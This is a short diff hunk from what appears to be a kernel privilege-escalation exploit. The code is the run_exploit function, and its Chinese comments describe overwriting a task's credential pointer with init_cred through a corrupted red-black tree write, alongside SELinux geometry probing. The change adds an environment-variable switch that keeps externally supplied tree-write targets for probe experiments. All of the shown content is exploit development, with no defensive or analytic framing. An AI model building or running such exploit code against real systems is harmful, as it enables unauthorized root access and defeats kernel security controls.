@@ -846,9 +846,15 @@ int run_exploit(int argc, char **argv) {
          * WPC = cred_ptr-8 (写目标: parent->rb_right = task+0x780)
          * WRIGHT = init_cred dmap (写入值)
          * WLEFT = 0 (Case-1 主树写, 不崩) */
-        setenv("PSELECT_TREE_PC", pc_env, 1);   /* mt47: 三模式统一走 TREE_PC 主树 */
-        setenv("PSELECT_TREE_RIGHT", right_env, 1); /* mt47: ★不再写死0★ PTR_MODE 写 init_cred 指针 */
-        setenv("PSELECT_TREE_LEFT", left_env, 1);
+        /* mt47: 三模式统一走 TREE_PC 主树 */
+        /* mt52: PSELECT_GEOM_KEEP=1 → 保留外部 TREE_PC/RIGHT/LEFT 不被覆盖。
+         * 探针用: ENF 几何(TREE_PC=selinux, RIGHT=默认fake_lock) + cred 机制
+         * (fork/perf/poll) 的隔离实验。无此 env 行为与旧版逐字节一致。 */
+        if (!getenv("PSELECT_GEOM_KEEP")) {
+          setenv("PSELECT_TREE_PC", pc_env, 1);
+          setenv("PSELECT_TREE_RIGHT", right_env, 1); /* mt47: ★不再写死0★ PTR_MODE 写 init_cred 指针 */
+          setenv("PSELECT_TREE_LEFT", left_env, 1);
+        }
         setenv("PSELECT_WPC", "0", 1);
         setenv("PSELECT_WRIGHT", "0", 1);
         setenv("PSELECT_WLEFT", "0", 1);
